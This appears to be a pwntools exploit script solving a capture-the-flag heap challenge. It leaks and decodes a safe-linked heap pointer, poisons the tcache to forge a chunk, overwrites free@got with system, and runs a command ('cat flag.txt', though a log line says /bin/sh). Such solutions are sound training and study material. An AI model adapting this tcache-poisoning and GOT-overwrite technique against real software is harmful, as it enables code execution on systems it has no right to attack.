from pwn import *

def add_horse(r, index, name, name_len=None):
    if not name_len:
        name_len = len(name)
    assert name_len >= 16
    r.sendline(b'1')
    r.recvuntil(b'Stable index # (0-17)? ')
    r.sendline(str(index).encode())
    r.recvuntil(b'Horse name length (16-256)? ')
    r.sendline(str(name_len).encode())
    r.recvuntil(b'characters: ')
    r.sendline(name + b'\xff')
    r.recvuntil(b'Choice: ')

def remove_horse(r, index, shell=False):
    r.sendline(b'2')
    r.recvuntil(b'Stable index # (0-17)? ')
    r.sendline(str(index).encode())
    if not shell:
        r.recvuntil(b'Choice: ')

def race(r):
    r.sendline(b'3')

def cheat(r, index, name, spot):
    assert(len(name) <= 0x10)
    r.sendline(b'0')
    r.recvuntil(b'You may try to take a head start, if you get caught you will be banned from the races!')
    r.sendline(str(index).encode())
    r.sendline(name + b'\xff')
    r.recvuntil(b'New spot? ')
    r.sendline(str(spot).encode())
    r.recvuntil(b'Choice: ')

def decrypt(x):
    key = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        p = ((x ^ key) >> bits) << bits
        key = p >> 12
    return p

def race(r):
    r.sendline(b'3')
    r.recvuntil(b' ')
    x = r.recvuntil(b'|')
    print(hexdump(x))
    x = x.lstrip(b'\r\n ').split(b' ')[0]
    while len(x) != 8:
         x += b'\0'
    leak = u64(x)
    log.info(f"Leak: 0x{leak:x}")
    # chunk = (leak >> 12) ^ leak
    chunk = decrypt(leak)
    log.info(f"Chunk: 0x{chunk:x}")
    assert (chunk >> 12) ^ chunk == leak
    heap = chunk & ~0xfff
    r.recvuntil(b'Choice: ')
    return heap

if args['REMOTE']:
    r = remote(args.HOST, int(args.PORT))
else:
    r = process('./vuln')

r.recvuntil(b'Choice: ')

log.info("Leak heap base")
# We need to free 2 chunks to have a heap pointer we can leak
for i in range(2):
    add_horse(r, i, b"A" * 0x10)

for i in range(2):
    remove_horse(r, i)

# We need minimum 5 horses to start a race
for i in range(5):
    add_horse(r, i, b"", name_len=16)

heap = race(r)
log.info(f'Heap: 0x{heap:x}')

log.info("Allocate fake chunk for horse name that overlaps with horse entry")
# Put 2 chunks in tcache
# For some reason, with just 1 chunk, it will not work!
remove_horse(r, 0)
remove_horse(r, 1)

# Overwrite fd pointer in freed chunk
fake_index = 10
entry_size = 0x10
fake_chunk = heap + 0x2a0 + fake_index * entry_size
log.info(f"Fake chunk: 0x{fake_chunk:x}")
fake_fd = fake_chunk ^ (fake_chunk >> 12)
cheat(r, 1, p64(fake_fd), 0)

add_horse(r, 0, b'cat flag.txt\0', name_len=0x10)

# The following horse name will point to the horse entry at fake_index
free_got = 0x404018
name = p64(free_got) + p32(0) + p32(1)
add_horse(r, 5, name)

log.info(f"Horse #{fake_index}'s name points at free@got (0x{free_got:x})")

log.info("Overwrite free@got with system")
system = 0x401090

cheat(r, fake_index, p64(system), 0)

log.info('Trigger system("/bin/sh")')
remove_horse(r, 0, shell=True)

print(r.recvuntil(b'Choice: '))
